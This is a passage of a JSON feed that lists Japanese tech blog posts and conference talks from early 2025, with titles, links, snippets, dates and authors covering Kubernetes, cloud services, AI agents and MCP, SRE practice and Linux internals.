Controller)は、Kubernetesのリソースを監視し、AWS Elastic Load Balancerをそれにあわせて管理するコンポーネントです。AWS LBCが監視する対象は、EKS内のIngressリソースとService Type LoadBalancerリソースです。これらのKubern...","isoDate":"2025-04-28T05:52:13.000Z","dateMiliSeconds":1745819533000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Testkubeとは？KubernetesクラスタにおけるE2Eテストの統合","link":"https://sreake.com/blog/testkube-e2e-test-on-kubernetes-cluster/","contentSnippet":"Sreake事業部の荒木です。KubernetesやSRE、LLM領域の関連技術など幅広い領域にわたって調査・検証を行っています。 今回、kubernetesクラスタのE2Eテストを統合、管理することができるTestku […]The post Testkubeとは？KubernetesクラスタにおけるE2Eテストの統合 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-25T12:27:40.000Z","dateMiliSeconds":1745584060000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SRE向けイベント【3-shake SRE Tech Talk #12】〜o11y Special〜 を開催します","link":"https://sreake.com/blog/sre-tech-talk-12/","contentSnippet":"この度、スリーシェイクは、SRE向けイベント【3-shake SRE Tech Talk #12】〜o11y Special〜 を、2025年5月16日（金）に開催します。The post SRE向けイベント【3-shake SRE Tech Talk #12】〜o11y Special〜 を開催します first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-25T11:45:29.000Z","dateMiliSeconds":1745581529000,"authorName":"Sreake","authorId":"Sreake"},{"title":"OpenFeature を使ったアプリケーション開発","link":"https://sreake.com/blog/openfeature-feature-flag-management/","contentSnippet":"はじめに はじめましての方も、そうじゃない方も、こんにちはこんばんは。Sreake 事業部 佐藤慧太(@SatohJohn)です。 皆さん、アプリケーションのコードを変更せずに機能の有効無効を切り替えることができる Fe […]The post OpenFeature を使ったアプリケーション開発 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-23T09:40:01.000Z","dateMiliSeconds":1745401201000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ここはMCPの夜明けまえ","link":"https://speakerdeck.com/nwiizo/kokohamcpnoye-ming-kemae","contentSnippet":"本日、「AI駆動開発実践の手引き -これが僕/私のAI（アイ）棒」というイベントで「ここはMCPの夜明けまえ」 \uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: 【ハイブリッド開催】AI駆動開発実践の手引き -これが僕/私のAI（アイ）棒-\\r- 公式URL: https://hack-at-delta.connpass.com/event/350588/\\r\\r\uD83D\uDCDD 登壇ブログ\\r- 2025年4月、AIとクラウドネイティブの交差点で語った2日間の記録 #CNDS2025 #hack_at_delta\\r- https://syu-m-5151.hatenablog.com/entry/2025/04/24/113500","isoDate":"2025-04-23T04:00:00.000Z","dateMiliSeconds":1745380800000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Dockerを使用せずにイメージを作成し実行してみる - go-containerregistryによる実装","link":"https://qiita.com/m_pig/items/82643135254b5b326e61","contentSnippet":"このページではコンテナイメージがどのように作成されているのかを、go-containerregistryライブラリを使った実装例を通して解説します。Dockerfileを使わずに、プログラムからコンテナイメージを作成する過程を見ていきます。コードの全体像createT...","isoDate":"2025-04-23T02:38:27.000Z","dateMiliSeconds":1745375907000,"authorName":"Yushin Matsuura","authorId":"matsuura"},{"title":"EKS Pod Identityを利用してセキュアにkubernetesリソースからAWSリソースにアクセスする","link":"https://zenn.dev/kamos/articles/873ecca3f9bab0","contentSnippet":"はじめにAWS EKS (Elastic Kubernetes Service) を利用している場合、Kubernetes上のリソースだけで完結させることはほぼなく、多くの場合、kubernetesの世界にないAWSリソースにアクセスする必要があります。例えば、S3バケットへのファイルのアップロード、DynamoDBのテーブルへのデータの読み書き、SQSキューへのメッセージの送受信など、様々なユースケースが考えられます。その際に使用するのがPod Identityです。https://docs.aws.amazon.com/ja_jp/eks/latest/userguide/p...","isoDate":"2025-04-22T09:37:59.000Z","dateMiliSeconds":1745314679000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"生成AIによるCloud Native基盤構築の可能性と実践的ガードレールの敷設について","link":"https://speakerdeck.com/nwiizo/sheng-cheng-ainiyorucloud-native-ji-pan-gou-zhu-noke-neng-xing-toshi-jian-de-gadorerunofu-she-nituite","contentSnippet":"こんにちは皆さん！本日はCloud Native Daysのプレイベントで登壇させていただきます。2019年以来の登壇となりますが、当時はまだ肩こりなんて無縁だったんですよね…。\\r\\r時の流れは容赦ないもので、最近の肩こりが辛くて昨日も整骨院に通ってきました。30分の持ち時間に対してスライドが80枚以上という暴挙にも出ています。\\r\\r---\\r\\r本日、「CloudNative Days Summer 2025 プレイベント」というイベントで「生成AIによるCloud Native 基盤構築の可能性と実践的ガードレールの敷設について」 \uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: CloudNative Days Summer 2025 プレイベント\\r- 公式URL:https://cloudnativedays.connpass.com/event/351211/ \\r- イベントのURL: https://event.cloudnativedays.jp/cnds2025\\r\\r\uD83D\uDCDD 登壇ブログ\\r- 2025年4月、AIとクラウドネイティブの交差点で語った2日間の記録 #CNDS2025 #hack_at_delta\\r- https://syu-m-5151.hatenablog.com/entry/2025/04/24/113500","isoDate":"2025-04-22T04:00:00.000Z","dateMiliSeconds":1745294400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"クラウド開発環境Cloud Workstationsの紹介","link":"https://speakerdeck.com/yunosukey/kuraudokai-fa-huan-jing-cloud-workstationsnoshao-jie","contentSnippet":"","isoDate":"2025-04-22T04:00:00.000Z","dateMiliSeconds":1745294400000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Lookerの独自言語「LookML」とは","link":"https://sreake.com/blog/what-is-lookml/","contentSnippet":"はじめに 2023年10月にGoogleが提供するBIツール「Looker」が政府認定クラウドサービス(通称 ISMAP) に認定されてから、早1年と半年程が経ちました。 もしかすると、「Lookerを導入してみた」「ま […]The post Lookerの独自言語「LookML」とは first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-22T03:29:39.000Z","dateMiliSeconds":1745292579000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Intel SDMをRAG化してMCP経由でClineに使わせる","link":"https://dev.mix64.com/2025/04/17/rag-mcp-cline/","contentSnippet":"今回はIntel SDMをはじめとした数千枚のPDF仕様書をRAGとして作成し、それをMCP経由でClineに使わせることでAIエージェント...","isoDate":"2025-04-17T07:24:48.000Z","dateMiliSeconds":1744874688000,"authorName":"ayibote","authorId":"ayibote"},{"title":"Google Cloud Next 2025 データベースRecap ~データベース関連の全41リリースを紹介~","link":"https://sreake.com/blog/google-cloud-next-2025-database-updates/","contentSnippet":"AgentspaceやAgent Development Kit、A2A Protocolの発表など生成AI関連の発表が目立ったGoogle Cloud Next 2025ですが、データベース関連でも魅力的なリリースがた […]The post Google Cloud Next 2025 データベースRecap ~データベース関連の全41リリースを紹介~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-17T03:04:19.000Z","dateMiliSeconds":1744859059000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google Cloud Privileged Access Manager (PAM)を使用したアカウント管理","link":"https://sreake.com/blog/account-management-by-google-cloud-privileged-access-manager/","contentSnippet":"はじめに Google Cloud Privileged Access Manager (PAM)は、Google Cloud における特権アクセス管理のためのフルマネージドサービスです。2024年5月にプレビュー版が提 […]The post Google Cloud Privileged Access Manager (PAM)を使用したアカウント管理 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-15T09:00:04.000Z","dateMiliSeconds":1744707604000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ディレクトリ構成の基本原則","link":"https://sreake.com/blog/directory-structure-good-practice/","contentSnippet":"こんにちは。スリーシェイクの中原です。 プロジェクトが大きくなるにつれて「メンテナンスがしづらい」「開発スピードが遅い」と悩みを抱える要因の一つに「ディレクトリ構造がイケてない」があると考えています。 本日は、そういった […]The post ディレクトリ構成の基本原則 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-14T03:44:43.000Z","dateMiliSeconds":1744602283000,"authorName":"Sreake","authorId":"Sreake"},{"title":"genai-toolbox を実装して mcp server として公開し ADK から使ってみる","link":"https://zenn.dev/satohjohn/articles/dbf4afed585680","contentSnippet":"mcp server を作ってみるということで、genai-toolbox という物があるのでそれを元にやっていきますhttps://github.com/googleapis/genai-toolboxこちらは、各 DB への接続情報と、どういう SQL を実行するかを yaml、または、http の baseurl と request parameter などで記載することで tool を作成することができます。接続先は図にもある形になると思います。https://github.com/googleapis/genai-toolbox/raw/main/docs/en/get...","isoDate":"2025-04-13T01:54:27.000Z","dateMiliSeconds":1744509267000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"既存の mcp を ADK 経由で叩いてみる。 playwright を使う。","link":"https://zenn.dev/satohjohn/articles/68bdde2842e8b4","contentSnippet":"mcp の client に付いて詳しくなりたいと思いつつ adk についてもやりたいのでチョット調べてみます。今回は playwright の mcp に繋いでみようと思います。https://mcp.so/server/playwright-mcp/microsoft?tab=contentplaywright は別サーバで立てるような想定で考えておきます。そのためドキュメントにある通り以下のように記載します$ npx @playwright/mcp@latest --port 8931Listening on http://localhost:8931Put this...","isoDate":"2025-04-12T10:12:09.000Z","dateMiliSeconds":1744452729000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ADK で作った agent を mcp server で公開する","link":"https://zenn.dev/satohjohn/articles/48a82ff7de531b","contentSnippet":"ほぼ前回の続きhttps://zenn.dev/satohjohn/articles/b23bd65c289257A2A を調べてたんですがその前に mcp 何も知らんということで実装しながら手で覚えていきます。前回使っていた code_agent (sequential_agent) を公開できるようにします。ADK の agent を作ったら、それを mcp server として公開ができる AgentTool というものがあるので、それを使います。https://google.github.io/adk-docs/tools/function-tools/#3-agent...","isoDate":"2025-04-11T16:21:06.000Z","dateMiliSeconds":1744388466000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"ADK + Cloud Run を動かす","link":"https://zenn.dev/satohjohn/articles/b23bd65c289257","contentSnippet":"Google Cloud Next \'25 に参加してます。そのうち会社のほうで参加レポートを出します。こちらは ADK(Agent Development Kit、Android ではない) のメモ書きのようなものです2025/04/11 時点だと python でしか ADK はリリースされていないようです。 Cloud Run で動かすCloud Run で動かす方法自体は https://google.github.io/adk-docs/deploy/cloud-run/ に記載されていますのでほぼこちらを参考にお願いします。ディレクトリやファイルは以下のとおりで...","isoDate":"2025-04-11T08:02:18.000Z","dateMiliSeconds":1744358538000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"スリーシェイク、2025 Google Cloud Infrastructure Modernization Partner of the Year – Japan を受賞","link":"https://sreake.com/blog/2025-google-cloud-partner-of-the-year/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2025年4月9日に、「2025 Google Cloud Partner of the Year」において「Infrastructure Modernization Partner of the Year - Japan」を受賞したことをお知らせします。The post スリーシェイク、2025 Google Cloud Infrastructure Modernization Partner of the Year – Japan を受賞 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-09T01:00:00.000Z","dateMiliSeconds":1744160400000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Geminiとリアルタイム音声会話できるWebアプリの作り方","link":"https://sreake.com/blog/gemini-realtime-voice-chat-app/","contentSnippet":"はじめに 現在、生成AIを利用したアプリケーションが増加しています。その多くはテキストを中心としたものですが、アプリケーションによっては音声や動画でのやり取りが必要となることもあります。これまで生成AIとの音声・動画のや […]The post Geminiとリアルタイム音声会話できるWebアプリの作り方 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-04-08T06:04:03.000Z","dateMiliSeconds":1744092243000,"authorName":"Sreake","authorId":"Sreake"},{"title":"n8n on Cloud Run （ツール比較から選定まで）","link":"https://zenn.dev/meziron/articles/bff3ac566f8b93","contentSnippet":"はじめにこんにちは！日々の業務や個人開発で、繰り返し行う作業や複数のサービス間でのデータ連携に「もっと楽にならないかな？」と感じることはありませんか？私もその一人で、ワークフロー自動化ツールの導入を検討し始めました。世の中にはZapierやIFTTTといったSaaS型の有名なツールがありますが、今回はオープンソースでセルフホストも可能な選択肢を中心に比較検討しました。この記事では、まず私がなぜ n8n を選んだのか、その理由を説明します。そして後半では、選定したn8nを Terraform を使用して Cloud Run 上に構築した際の具体的な手順や構成について解説します。...","isoDate":"2025-04-08T04:53:10.000Z","dateMiliSeconds":1744087990000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"運用中のDBに後付け Prisma Migrate を途中から導入する実践ガイド","link":"https://zenn.dev/meziron/articles/a95d3133a1c385","contentSnippet":"運用中のDBに後付け Prisma Migrate を途中から導入する実践ガイド（ハマりどころ解説付き） はじめに (きっかけ)「このプロジェクト、最初は Prisma 使ってたけど、マイグレーションまでは管理してなかったんだよな...」「開発も進んで、そろそろちゃんとスキーマ変更を管理したいけど、_prisma_migrations テーブルがない...」そんな状況、ありませんか？ 私もまさにその状況に直面しました。Prisma は導入済みでデータベーススキーマも存在しているけれど、Prisma Migrate によるマイグレーション管理は行われていない。運用が始まってい...","isoDate":"2025-04-07T05:34:46.000Z","dateMiliSeconds":1744004086000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"【スリーシェイク】入社エントリ\uD83E\uDD73 \uD83C\uDF89","link":"https://zenn.dev/meziron/articles/9d727354b70ecd","contentSnippet":"こんにちは！こんばんは！スリーシェイクにフルスタックエンジニアとして入社して2ヶ月が経ちました、あびまる（釘宮）です。この2ヶ月間、スリーシェイクのカルチャー、メンバーの意識の高さ、そして温かい雰囲気に触れ、非常に充実した日々を送っています。今回は、私が実際に体験したスリーシェイクの魅力について、すこしだけ語らせてください！\uD83D\uDE47 会社のカルチャーへの感動まず、会社のカルチャーに深く感銘を受けました。CEO自らが技術発信の重要性を説き、社会のtoil（無駄な作業）をなくすために全力を尽くす姿勢は、非常に刺激的です。✨また、社長との定期的なミーティングでは、プロダクトやサービスの新機...","isoDate":"2025-04-03T14:01:57.000Z","dateMiliSeconds":1743688917000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"GTC2025 参加記録　~Keynote~","link":"https://sreake.com/blog/gtc2025-keynote/","contentSnippet":"3-shakeのsreake事業部でフルスタックエンジニアとして、主にML周りを担当している赤川です。今回は、サンフランシスコのサンノゼで3/17~3/21に開催されたGTC2025において、NVIDIA CEOのJen […]The post GTC2025 参加記録　~Keynote~ first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-31T00:26:08.000Z","dateMiliSeconds":1743380768000,"authorName":"Sreake","authorId":"Sreake"},{"title":"gopass を使ってパスワード共有を試す","link":"https://blog.1q77.com/2025/03/share-password-using-gopass/","contentSnippet":"gopass とはPostgres Weekly を眺めていて Creating Postgres Roles with Passwords Stored in Gopass という記事で gopass というものの存在を知りました。名前から分かるように Go 言語で書かれており、マルチプラットフォームのパスワード管理用コマンドラインツールです。GPG を使って暗号化し、Git で管理します。GPG の公開鍵暗号を使って複数人で複合することが可能になっており、任意の人とパスワードを共有することが可能です。","isoDate":"2025-03-29T00:57:32.000Z","dateMiliSeconds":1743209852000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"nvidia/cuda imageを使ってDockerコンテナでGPUを使用する","link":"https://sreake.com/blog/gpu-used-docker-with-nvidia-cuda-image/","contentSnippet":"はじめに Sreake事業部アプリケーション開発チームの角谷です！ 最近、機械学習やディープラーニング、特に生成AIの分野で、GPUの活用がますます重要になってきています。 Stable DiffusionやChatGP […]The post nvidia/cuda imageを使ってDockerコンテナでGPUを使用する first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-27T04:33:27.000Z","dateMiliSeconds":1743050007000,"authorName":"Sreake","authorId":"Sreake"},{"title":"【調査】curl の CVE-2023-38545 について","link":"https://dev.mix64.com/2025/03/25/cve-2023-38545/","contentSnippet":"過去最悪の脆弱性と自称したことで話題になった curl の CVE-2023-38545 について、ソースコードベースでどういう挙動をしてい...","isoDate":"2025-03-25T14:57:59.000Z","dateMiliSeconds":1742914679000,"authorName":"ayibote","authorId":"ayibote"},{"title":"Kubernetesで実現できるPlatform Engineering の現在地","link":"https://speakerdeck.com/nwiizo/kubernetesdeshi-xian-dekiruplatform-engineering-noxian-zai-di","contentSnippet":"本日、「Kubernetesで実践する Platform Engineering - FL#88」というイベントで「Kubernetesで実現できるPlatform Engineering の現在地」\uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: Kubernetesで実践する Platform Engineering - FL#88\\r- 公式URL: https://forkwell.connpass.com/event/348104/\\r\\r\uD83D\uDDE3️ 関連スライド\\r- インフラをつくるとはどういうことなのか、 あるいはPlatform Engineeringについて\\r- https://speakerdeck.com/nwiizo/inhurawotukurutohadouiukotonanoka-aruihaplatform-engineeringnituite\\r- Platform Engineeringは自由のめまい\\r- https://speakerdeck.com/nwiizo/platform-engineeringhazi-you-nomemai","isoDate":"2025-03-25T04:00:00.000Z","dateMiliSeconds":1742875200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"論文紹介 ”A Survey on Large Language Model based Autonomous Agents”","link":"https://speakerdeck.com/shukob/lun-wen-shao-jie-a-survey-on-large-language-model-based-autonomous-agents","contentSnippet":"https://genai-users.connpass.com/event/349197/\\r\\rこの論文は大規模言語モデル（LLM）を基盤とする自律型エージェントに関する包括的な調査論文です。この論文は、LLMベースの自律型エージェントの現状、構成要素、課題、そして将来の展望について詳細に解説しています。\\r\\r本論文を読むことで、AIエージェントの概要を体系的に知ることができます。","isoDate":"2025-03-24T04:00:00.000Z","dateMiliSeconds":1742788800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"SLI/SLO・ラプソディあるいは組織への適用の旅","link":"https://speakerdeck.com/nwiizo/slorapusodeiaruihazu-zhi-henoshi-yong-nolu","contentSnippet":"こんにちは、花粉症が辛いです。登壇する時にくしゃみしないために朝から外出を自粛してます。15分なのにスライドが40枚あります。\\r\\r\\r本日、「信頼性向上の第一歩！～SLI/SLO策定までの取り組みと運用事例～」というイベントで「SLI/SLO・ラプソディあるいは組織への適用の旅」\uD83C\uDFB5\uD83E\uDDED というタイトルで登壇しました！\\r\\r\uD83D\uDD0D イベント詳細:\\r- イベント名: 信頼性向上の第一歩！～SLI/SLO策定までの取り組みと運用事例～\\r- 公式URL: https://findy.connpass.com/event/345990/\\r\\r\uD83D\uDCDA さらに！4日後の3月25日には翻訳した書籍に関する登壇する別イベントもあります！\uD83D\uDE32\\r「Kubernetesで実践する Platform Engineering - FL#88」\uD83D\uDC33⚙️\\r興味がある方はぜひ参加してください！\uD83D\uDC68‍\uD83D\uDCBB\uD83D\uDC69‍\uD83D\uDCBB\\r\uD83D\uDC49 https://forkwell.connpass.com/event/348104/\\r\\rお見逃しなく！\uD83D\uDDD3️✨","isoDate":"2025-03-20T04:00:00.000Z","dateMiliSeconds":1742443200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"【解説】Linux 6.12で高速化されたVirtioVsockについて","link":"https://dev.mix64.com/2025/03/16/virtio-vsock/","contentSnippet":"今回はLinux 6.12で高速化された VirtioVsock について、どのような改善が行われたのかLinuxのソースコードベース解説し...","isoDate":"2025-03-16T13:06:55.000Z","dateMiliSeconds":1742130415000,"authorName":"ayibote","authorId":"ayibote"},{"title":"外向けに話すときは相手のメリットを話そう","link":"https://nnaka2992.hatenablog.com/entry/2025/03/14/204148","contentSnippet":"お仕事をしているとチームや自分の周りで合意を取ったことを、相手にお願いしに行くことが多々あります。例えばピープルマネジメントのマネージャー層でxxというやり方を試していきたいと合意をとったものを、相手にお願いしに行くこと。例えば自分たちの担当範囲の決め事で、相手に協力をお願いしに行くこと。例えば自分たちのシステムと他システム間の決め事で、こちらの方針を相談しに行くこと。自分たちの決め事を相手に協力してもらうことはよくあります。方針を固めるまでにディスカッションを重ね、自分たちにどのようなメリットがあるかは詳細に話すでしょう。自分たちの考えやメリットも詳細に説明できるでしょう。では相手のメリットはどうでしょう？ 自分の考えやメリットの説明で終わってはいないでしょうか？相手のアクションが必要なとき、ポジションティブに動いてもらうには相手の動機が重要です。相手にメリット考えて貰うより、発案者から提案したほうが心象も良くなります。要は相手の立場を考えましょうの一側面です。相手と話すときは相手の立場を考えましょう。","isoDate":"2025-03-14T11:41:48.000Z","dateMiliSeconds":1741952508000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"ObservabilityCON on the Road Tokyo 2025 Recap","link":"https://sreake.com/blog/observabilitycon-on-the-road-tokyo-2025-recap/","contentSnippet":"はじめに Sreake事業部の岩﨑です。 2025年2月25日、ObservabilityCON on the Road Tokyo 2025 が東京ポートシティ竹芝で開催されました。初めての参加でしたが、Grafana […]The post ObservabilityCON on the Road Tokyo 2025 Recap first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-14T02:09:01.000Z","dateMiliSeconds":1741918141000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google CloudのTerraform職人が失職する機能が出てしまった……","link":"https://zenn.dev/nnaka2992/articles/intro_to_application_design_center","contentSnippet":"Google CloudがApplication Design Centerという、構成図を書けばTerraformを書いて、デプロイまで行う機能をリリースしました。[1]https://cloud.google.com/application-design-center/docs/overviewどうやらGoogle CloudはTerraform職人を失職に追い込みたいようです。 Application Design Centerの概要アプリケーション デザイン センターは、Google Cloud アプリケーション インフラストラクチャの設計、共有、デプロイに役立ちます...","isoDate":"2025-03-11T00:30:01.000Z","dateMiliSeconds":1741653001000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"フロントエンドオブザーバビリティ on Google Cloud","link":"https://speakerdeck.com/yunosukey/hurontoendoobuzababiritei-on-google-cloud","contentSnippet":"","isoDate":"2025-03-07T05:00:00.000Z","dateMiliSeconds":1741323600000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"【解説】Linux 6.14で導入されるUncached Buffered I/O について","link":"https://dev.mix64.com/2025/03/06/uncached-bufferd-io/","contentSnippet":"今回は Linux 6.14で導入される Uncached Buffered I/O について解説します。従来のBuffered I/OとD...","isoDate":"2025-03-06T14:29:56.000Z","dateMiliSeconds":1741271396000,"authorName":"ayibote","authorId":"ayibote"},{"title":"StageCrewとは？マルチモーダルAIツールを触ってみた","link":"https://sreake.com/blog/research-multi-modal-tool-stagecrew/","contentSnippet":"StageCrew™️とは StageCrew™（https://stagecrew.ai/）は、システム監視やログ収集、トランザクションのトレースといった各種管理ツールに対するアクセスを自動化、インシデント発生時の対応 […]The post StageCrewとは？マルチモーダルAIツールを触ってみた first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-06T11:13:20.000Z","dateMiliSeconds":1741259600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"LookMLって定数を定義できるの?","link":"https://zenn.dev/nedoko_dok0dko/articles/6d6bacc1a294b9","contentSnippet":"whatLookMLで定数を定義する事ができるのか調べてみた個人ログ Q.LookMLって定数を定義できるの?A. できるLookMLも他のプログラミング言語と同じように定数を設定できる。 定数の定義とマニフェストファイル マニフェストファイルLookMLにおいて、定数はマニフェストファイルというファイルを作成することによって定義する事ができる。https://cloud.google.com/looker/docs/lookml-project-files?hl=ja#project_manifest_filesマニフェストファイルは、定数の定義以外にも...","isoDate":"2025-03-06T10:53:04.000Z","dateMiliSeconds":1741258384000,"authorName":"seno","authorId":"seno"},{"title":"KotlinでAndroidアプリを作ってみる（超初級編）","link":"https://qiita.com/masaru-komiyama/items/8231c0e69d9fb54909aa","contentSnippet":"インフラ屋でもクソアプリを作りたくなる夜があるじゃない！と、言うことで本日は手元のMac端末でKotlinを触ってみようと思います。超初級編なので、あまり深い記事は期待しないでください。とりあえず環境整えて、動かしてみよう！　と気軽に取り掛かるきっかけとなることを重視...","isoDate":"2025-03-03T13:22:04.000Z","dateMiliSeconds":1741008124000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"技術的負債と立ち向かう前に知っておいてもいいこと","link":"https://sreake.com/blog/think-about-technical-debt/","contentSnippet":"はじめに こんにちは、nwiizoです。開発チームの会話の中で「これは技術的負債だから後で対処しよう」という言葉をよく耳にします。納期に追われるプロジェクトでは、この「後で」が永遠の「いつか」になりがちです。結果として多 […]The post 技術的負債と立ち向かう前に知っておいてもいいこと first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-03T10:46:12.000Z","dateMiliSeconds":1740998772000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ユーザーストーリーにこだわって、プロダクトバックログをスクラムチームが行う作業の唯一の情報源として成立させる","link":"https://sreake.com/blog/step-up-product-backlog-and-user-story-development/","contentSnippet":"Sreake事業部アプリケーション開発チームの安本です。 現在、スクラムでアプリケーション開発の概念検証（Proof of Concept; PoC）を進めています。 本記事では、スクラム開発を行っているチーム向けに、私 […]The post ユーザーストーリーにこだわって、プロダクトバックログをスクラムチームが行う作業の唯一の情報源として成立させる first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-03-03T01:17:49.000Z","dateMiliSeconds":1740964669000,"authorName":"Sreake","authorId":"Sreake"},{"title":"くちあだきみあむはしきぎ","link":"https://qiita.com/masaru-komiyama/items/0160cf23fbe2576f869c","contentSnippet":"おい！タイトルバグってんぞ！　と思われた皆様。安心してください。バグっておりません。電気回路を嗜んだ方なら、何かあったときについ口ずさんでしまう復活の呪文（まぁ色んな意味で記憶を呼び起こす呪文なので嘘は言っていない）...　じゃなくて、カラーコードの覚え方について簡単に書...","isoDate":"2025-03-02T12:57:49.000Z","dateMiliSeconds":1740920269000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"[2025/02/28] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20250228","contentSnippet":"#kubenewsの2025年02月28日の回で話す、@bells17が最近気になったニュース記事をまとめたものです。自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってます。この記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です。配信URL:https://www.youtube.com/live/e4qQt7sQ46Y 告知とかニュースっぽいもの コードを読んで理解するko buildhttps...","isoDate":"2025-02-28T10:19:14.000Z","dateMiliSeconds":1740737954000,"authorName":"bells17","authorId":"bells17"},{"title":"AIエージェント元年@日本生成AIユーザ会","link":"https://speakerdeck.com/shukob/aiezientoyuan-nian-at-ri-ben-sheng-cheng-aiyuzahui","contentSnippet":"https://genai-users.connpass.com/event/344332/\\r2024年は生成AIが世の中に浸透した1年でしたが、2025年はAIエージェント元年と言われています。\\r\\r生成AIはチャットベースで受け身なものでしたが、AIエージェントは自律的にタスクを分解しこなすことができます。そのインパクトは計り知れません。\\r\\r生成AIの概略を説明した後、AIエージェントの紹介をします。","isoDate":"2025-02-28T05:00:00.000Z","dateMiliSeconds":1740718800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloud Model Armorによるプロンプトインジェクション対策","link":"https://sreake.com/blog/prompt-injection-protection-with-google-cloud-model-armor/","contentSnippet":"はじめに 昨年2024年は生成AIアプリケーションの開発が本格化し、RAG（Retrieval-Augmented Generation）が爆発的に流行した年でした。今年2025年はAIエージェントの年になると考えられて […]The post Google Cloud Model Armorによるプロンプトインジェクション対策 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2025-02-27T02:14:57.000Z","dateMiliSeconds":1740622497000,"authorName":"Sreake","authorId":"Sreake"},{"title":"AI時代におけるMLOpsのTips","link":"https://speakerdeck.com/shukob/aishi-dai-niokerumlopsnotips","contentSnippet":"https://event.ospn.jp/osc2025-spring/session/2017030\\rAI時代におけるMLOpsのTips 〜 MLOpsを加速させるOSS 〜\\rオープンソースカンファレンス2025 Tokyo/Spring\\rライトニングトークにてKubeflowの紹介などMLOpsの話をさせていただきました。","isoDate":"2025-02-22T05:00:00.000Z","dateMiliSeconds":1740200400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"AIエージェント元年","link":"https://speakerdeck.com/shukob/aiezientoyuan-nian","contentSnippet":"https://genai-users.connpass.com/event/344292/\\r\\r2024年は生成AIが世の中に浸透した1年でしたが、2025年はAIエージェント元年と言われています。\\r\\r生成AIはチャットベースで受け身なものでしたが、AIエージェントは自律的にタスクを分解しこなすことができます。そのインパクトは計り知れません。\\r\\r生成AIの概略を説明した後、AIエージェントの紹介をします。","isoDate":"2025-02-21T05:00:00.000Z","dateMiliSeconds":1740114000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"コンテナサプライチェーンセキュリティ","link":"https://speakerdeck.com/kyohmizu/kontenasapuraitiensekiyuritei","contentSnippet":"イベント登壇資料です。2025/02/21 #CNCJ\\rhttps://cncj-security.connpass.com/event/341812/","isoDate":"2025-02-21T05:00:00.000Z","dateMiliSeconds":1740114000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"OpenClarityの裏側を知りたい","link":"https://speakerdeck.com/kojake_300/openclaritynoli-ce-wozhi-ritai-fe15f317-ff7b-4f9e-acd4-8d389e3ebed8","contentSnippet":"","isoDate":"2025-02-20T05:00:00.000Z","dateMiliSeconds":1740027600000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"コードを読んで理解するko build","link":"https://speakerdeck.com/bells17/kotowodu-nteli-jie-suruko-build","contentSnippet":"Jagu\'e\'r Cloud Native #17 ハイブリッド Meetup ~ 推しの CNCF プロジェクトを紹介するぜ LT ~ 